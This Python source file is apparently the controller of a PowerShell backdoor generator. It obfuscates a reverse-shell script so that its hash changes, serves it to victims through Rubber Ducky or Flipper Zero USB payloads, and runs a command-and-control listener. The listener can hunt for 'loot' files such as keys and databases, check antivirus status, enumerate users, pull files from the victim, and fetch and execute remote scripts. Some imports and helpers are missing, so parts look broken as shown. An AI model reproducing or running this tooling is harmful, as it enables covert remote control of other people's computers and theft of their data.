import os
import time
import socket
import argparse
from core.utils import *
from core.config import Config
from core.payloads.payload import fetch

BLOCKSIZE = 65536
READ_AMOUNT = 50*1024

CWD = os.getcwd() + "//"

# This is used for generating a new name for each 
# variable and function in the powershell script. 
# The script is then base64 encoded ensuring a unique hash
POWERSHELL_SCRIPT_OBJECTS: list = [
    "UserDefinedIPAddress",
    "UserDefinedPort",
    "activeClient",
    "activeStream",
    "textBuffer",
    "textEncoding",
    "sessionWriter",
    "sessionReader",
    "createBackdoorConnection",
    "handleActiveClient",
    "writeToStream",
    "currentUser",
    "computerName",
    "pwd",
    "prompt",
    "rawResponse",
    "response",
    "output",
    "content",
    "readCount",
    "createPrompt",
    "readFromStream",
    "getCommand",
    "waitForConnection",
    "nothingtolookatreally",
    "BackdoorManager",
    "createTextStream",
    "command",
    "bytes",
    "powershellException",
    "msg",
]

class Client:
    def __init__(self, connection_tuple: tuple, config) -> None:
        self.config = config
        self.connection = connection_tuple[0] 
        self.address = connection_tuple[1]
        self.features = {
            "get_tools": self.get_tools,
            "get_public_ip": self.get_public_ip,
            "get_file": self.download_remote_file,
            "get_loot": self.get_loot,
            "print_help": self.print_help,
            "get_users": self.get_users,
            "get_os":self.get_os,
            "get_bios":self.get_bios,
            "get_antivirus":self.get_antivirus,
            "get_active": self.get_active,
            "install_choco": self.install_choco,
            "play_wav": self.play_wav,
        }

    def run_powershell_command(self, command: str, print_result: bool = True) -> None:
        """ Runs a powershell command
        :param command: Command to run
        :param print_result: If true the result is printed to the screen
        """
        self.connection.sendto(command.encode(), self.config.ip_tuple)
        if print_result:
            print(format_string(self.recvall()))

    def get_loot(self, command) -> None:
        """ Searches a directory for intresting files
        """
        try: 
            directory = command.split(" ")[1]
        except:
            return
        command = f'Get-ChildItem {directory} -Recurse -Include *.doc, *.pdf, *.json, *.pem, *.xlsx, *.xls, *.csv, *.txt ,*.db, *.exe'
        self.run_powershell_command(command)

    def get_users(self, command = None) -> None:
        """ Lists all users on the local computer
        """
        command = "Get-LocalUser | Select * | Out-String"
        self.run_powershell_command(command)

    def get_bios(self, command = None) -> None:
        """ Gets the BIOS's manufacturer name, bios name, and firmware type
        """
        command = "Get-ComputerInfo | select BiosManufacturer, BiosName, BiosFirmwareType  | Out-String"
        self.run_powershell_command(command)

    def get_active(self, command = None) -> None:
        """ Lists active TCP connections
        """ 
        command = "Get-NetTCPConnection -State Listen  | Out-String"
        self.run_powershell_command(command)

    def get_os(self, command = None) -> None:
        """ Gets infomation about the current OS build
        """
        command = "Get-ComputerInfo | Select OsManufacturer, OsArchitecture, OsName, OSType, OsHardwareAbstractionLayer, WindowsProductName, WindowsBuildLabEx | Out-String"
        self.run_powershell_command(command)

    def get_antivirus(self, command = None) -> None:
        """ Gets infomation about Windows Defender
        """
        command = "Get-MpComputerStatus | Select AntivirusEnabled, AMEngineVersion, AMProductVersion, AMServiceEnabled, AntispywareSignatureVersion, AntispywareEnabled, IsTamperProtected, IoavProtectionEnabled, NISSignatureVersion, NISEnabled, QuickScanSignatureVersion, RealTimeProtectionEnabled, OnAccessProtectionEnabled, DefenderSignaturesOutOfDate | Out-String"
        self.run_powershell_command(command)

    def install_choco(self, command = None) -> None:
        command = "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))"
        self.run_powershell_command(command)

    def play_wav(self, command) -> None:
        try:
            remote_file = command.split(" ")[1]
            duration = int(command.split(" ")[2])
        except:
            self.__send_fake_request()
            return
        out_file = "$env:TEMP\\tmpSound.wav"
        print(f"[*] Downloading {remote_file}")
        download_command = f'Invoke-WebRequest -URI {remote_file} -OutFile "{out_file}"'
        self.run_powershell_command(download_command, print_result=False)
        print(f"[*] Playing Audio")
        play_command = f'(New-Object System.Media.SoundPlayer("{out_file}")).PlaySync()'
        self.run_powershell_command(play_command, print_result=False)
        time.sleep(duration + 1)
        print("[*] Deleting Audio File")
        delete_command = f'remove-item -Path "{out_file}" -Force'
        self.run_powershell_command(delete_command, print_result=False)
        


    def print_help(self, command = None):
        print("""
Command         Description

get_antivirus    - Gets infomation about Windows Defender
get_os           - Gets infomation about the current OS build
get_active       - Lists active TCP connections
get_bios         - Gets the BIOS's manufacturer name, bios name, and firmware type
get_public_ip    - Makes a network request to api.ipify.org to and returns the computers public IP address
get_loot         - Searches a directory for intresting files (May take awhile) ... Syntax: get_loot <DIR>
get_tools        - Checks to see what tools are installed on the system
get_file         - Downloads a remote file and saves it to your computer ... Syntax: get_file <REMOTE_FILE> <LOCAL_FILE>
get_users        - Lists all users on the local computer
get_choco        - Installs chocolatey --> https://chocolatey.org/ (Requires Admin)
play_wav         - Plays a WAV file from a specified url (Stores WAV temporarly)
                                    URL to fetch wav file                               Duration in seconds (use whole numbers)
                   Syntax: play_wav https://www.soundjay.com/mechanical/chainsaw-01.wav 37 
    """)
        self.__send_fake_request()

    def get_tools(self, command = None):
        """  Checks to see what tools are installed on the system
        """
        tools = [    "nmap -V",    "nc -h",    "wireshark -v",    "python3 -V", "git -V"    "python -V",    "perl -V",    "ruby -h",    "hashcat -h",    "john -h",    "airmon-ng -h",    "wifite -h",    "sqlmap -h",    "ssh -V",    "gdb -h",    "radare2 -h",    "dig -h",    "whois -h",    "gcc -v",    "g++ -v",    "make -v",    "zip -h",    "unzip -h",    "tcpdump -h",    "nikto -h",    "dirb -h",    "hydra -h",    "nbtscan -h",    "netcat -h",    "recon-ng -h",    "sublist3r -h",    "amass -h",    "masscan -h",    "sqlninja -h",    "metasploit --version",    "aircrack-ng -h",   "ettercap -h",    "dsniff -h",    "driftnet -h",    "tshark --version"]
        print("[*] Listing Installed tools below")
        for tool in tools:
            content = None
            self.connection.sendto(tool.encode(), self.config.ip_tuple)
            while not isinstance(content, str):
                time.sleep(.5)
                content = format_string(self.recvall())
            if " is not recognized as the name of a cmdlet, " in content:
                continue
            if " " in tool:
                tool = tool.split(" ")[0]
            print(tool)
        self.__send_fake_request()

    def get_public_ip(self, command = None) -> None:
        """ Fetches the users public IP Address
        """
        self.connection.sendto('(Invoke-WebRequest -UseBasicParsing -uri "https://api.ipify.org/").Content | Out-String'.encode(), self.config.ip_tuple)
        print(format_string(self.recvall()))


    def __send_fake_request(self) -> None:
        """ Sends a request to reset the loop
        """
        self.connection.sendto("ls | Out-Null".encode(), self.config.ip_tuple)

    def download_remote_file(self, command) -> bool:
        """ Downloads a remote file from a backdoor session
        :param command: Command to read the file location from
        :return: True if the file was downloaded 
        """
        command = command.split(" ")
        try:
            file_location = command[2]
            remote_file = command[1]
        except:
            print("Downloads a remote file and saves it to your local computer \nsyntax: get_file <remote_path> <local_path>\nPlease use absolute paths!")
            self.__send_fake_request()
            return False
        self.connection.sendto(f"Get-Content -Path {remote_file}".encode(), self.config.ip_tuple)
        data = self.recvall()
        return save_content_to_file(data.decode(), file_location)

    def recvall(self) -> bytes:
        """ Receives all data in a socket connection
        :return: A byte object containing all the recieved data
        """
        data: bytes = b""
        while True:
            part = self.connection.recv(READ_AMOUNT)
            # print(len(part))
            data += part
            if len(part) < READ_AMOUNT:
                # either 0 or end of data
                break
        return data

    def process_additional_feature(self, command):
        """ Handles any external commands 
        :param command: Command to examine
        :return: True if the command was handled within the client class
        """
        command_function_requested = command
        if " " in command:
            command_function_requested = command.split(" ")[0]
        command_function = self.features.get(command_function_requested)
        if not command_function:
            return False
        command_function(command)
        return True

class Backdoor:
    def __init__(self, config: Config) -> None:
        """ Creates the backdoor
        :param config: Config object
        """
        self.config = config
        self.sock: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


    def handle_usb_payload(self) -> None:
        """ Creates ducky script/flipper script if needed
        """
        payload = None
        if self.config.payload:
            payload = fetch(self.config.payload, self.config)
        if not payload and (self.config.ducky or self.config.flipper):
            return False
        elif not payload:
            return True
        self.start_threaded_http_server()
        result =  payload.execute()
        if not result:
            payload.stop()
        return result

    def create_backdoor(self) -> None:
        """ Creates the backdoor file
        """
        if not self.obfuscate_backdoor():
            self.print_verbose_message("Failed to encode backdoor", prefix="-")
            exit()
        hash = get_sha1_file_hash(self.config.out_file)
        self.print_verbose_message(f"Saved backdoor {self.config.out_file} sha1:{hash}")
        if self.config.flipper or self.config.ducky:
            if not self.handle_usb_payload():
                self.print_verbose_message(f"Failed to process payload: {self.config.payload}", prefix="-")
                exit()

    def __just_one_please(self) -> None:
        """
        Processes One HTTP request then quits
        """
        # Holds
        self.httpd.handle_request()
        print(f"[*] Stopping HTTP server")
        self.httpd.shutdown()

    def start_threaded_http_server(self) -> None:
        """ Creates a thread for a HTTP server hosting our current working directory     
        """
        self.httpd = socketserver.TCPServer(self.config.server_ip_tuple, SimpleHTTPRequestHandler)
        thread = Thread(target=self.__just_one_please)
        thread.daemon = True
        thread.start()
        print(f"[*] Started HTTP server hosting directory http://{self.config.ip_address}:{self.config.server_port}/ ")

    def start_session(self) -> None:
        """ Creates the listener
        """
        print(f"[*] Starting Backdoor Listener {self.config.ip_address}:{self.config.port} use CTRL+BREAK to stop")
        self.sock.bind(self.config.ip_tuple)
        while True:
            self.sock.listen(1)
            client = Client(self.sock.accept(), self.config)
            self.print_verbose_message(f"Recieved connection from {client.address[0]}:{client.address[1]}")
            self.handle_client(client)

    def obfuscate_backdoor(self) -> bool:
        """ obfuscates the backdoor source template.ps1
        :return: True if the backdoor was obfuscated
        """
        self.print_verbose_message(f"Encoding backdoor script")
        backdoor = get_file_content(self.config.BACKDOOR_TEMPLATE)
        if not backdoor:
            return False
        for powershell_object in POWERSHELL_SCRIPT_OBJECTS:
            backdoor = obfuscate(backdoor, powershell_object)

        backdoor = backdoor.replace("4444", str(self.config.port))
        backdoor = backdoor.replace("0.0.0.0", self.config.ip_address)
        return save_content_to_file(backdoor, self.config.out_file)

    def handle_client(self, client) -> None:
        """ Handles an active backdoor session
        :param connection: Active backdoor session
        """
        print(LOGO)
        try:
            while True:
                time.sleep(.5)
                prompt = format_string(client.recvall())

                command = input(f"{prompt.strip()} ")

                if len(command) == 0:
                    command += "ls | Out-Null"

                time.sleep(.5)
                if not client.process_additional_feature(command) :
                    client.run_powershell_command(command)

        # Disconnect
        except ConnectionResetError:
            return



    def print_verbose_message(self, message: str, prefix: str = "*") -> None:
        """ Prints a verbose message
        :param message: Message to print
        :param prefix: Prefix to add before message 
        
        e.g:
        print_verbose_message(message="That didnt work :(", prefix="-")
        [-] That didnt work :(
        """
        if self.config.verbose:
            if prefix:
                prefix = f"[{prefix}] "
            print(prefix + message)

    def stop(self) -> None:
        """ Stops the TCP listener and ducky-server if started
        """
        self.sock.close()

    def start(self) -> None:
        if not self.config.just_listen_and_host and not self.config.just_listen:
            self.create_backdoor()
        elif self.config.just_listen_and_host:
            self.start_threaded_http_server()
        self.start_session()

def main(args) -> None:
    """ Creates a backdoor
    """
    try:
        config = Config(CWD, **vars(args))
        if config.list_payloads:
            show_help()
            exit()
        l = Backdoor(config)
        l.start()
    except KeyboardInterrupt:
        l.stop()
        exit("[*] Backdoor: CTRL+C Detected exiting!")
    except ConnectionResetError as e:
        l.stop()
        exit(f"Exiting! {e}")

if __name__ ==  "__main__":
    parser = argparse.ArgumentParser(description="Powershell Backdoor Generator")
    parser.add_argument(
        "--ip-address",
        "-i",
        help=f"IP Address to bind the backdoor too (default: {get_ip_address()})", 
        default=get_ip_address(),
    )
    parser.add_argument(
        "--port",
        "-p",
        help=f"Port for the backdoor to connect over (default: 4444)", 
        default=4444,
        type=int
    )
    parser.add_argument(
        "--random",
        "-r",
        help=f"Randomizes the outputed backdoor's file name", 
        default=False,
        action="store_true"
    )
    parser.add_argument(
        "--out",
        "-o",
        help=f"Specify the backdoor filename (relative file names)", 
        default="backdoor.ps1",
    )
    parser.add_argument(
        "--verbose",
        "-v",
        help=f"Show verbose output", 
        default=False,
        action="store_true"
    )
    parser.add_argument(
        "--delay",
        help=f"Delay in milliseconds before Flipper Zero/Ducky-Script payload execution (default:100)", 
        default=100,
    )
    parser.add_argument(
        "--flipper",
        help=f"Payload file for flipper zero (includes EOL conversion) (relative file name)", 
    )
    parser.add_argument(
        "--ducky",
        help=f"Creates an inject.bin for the http server", 
        default=False,
        action="store_true"
    )
    parser.add_argument(
        "--server-port",
        help=f"Port to run the HTTP server on (--server) (default: 8080)", 
        default=8080,
    )
    parser.add_argument(
        "--payload",
        help=f"USB Rubber Ducky/Flipper Zero backdoor payload to execute", 
    )
    parser.add_argument(
        "--list-payloads",
        help=f"List all available payloads", 
        default=False,
        action="store_true"
    )
    parser.add_argument(
        "-k",
        "--keyboard",
        help=f"Keyboard layout for Bad Usb/Flipper Zero (default: us)", 
        default="us",
    )
    parser.add_argument(
        "-A",
        "--actually-listen",
        help=f"Just listen for any backdoor connections", 
        default=False,
        action="store_true"
    )
    parser.add_argument(
        "-H",
        "--listen-and-host",
        help=f"Just listen for any backdoor connections and host the backdoor directory", 
        default=False,
        action="store_true"
    )
    args = parser.parse_args()
    main(args)
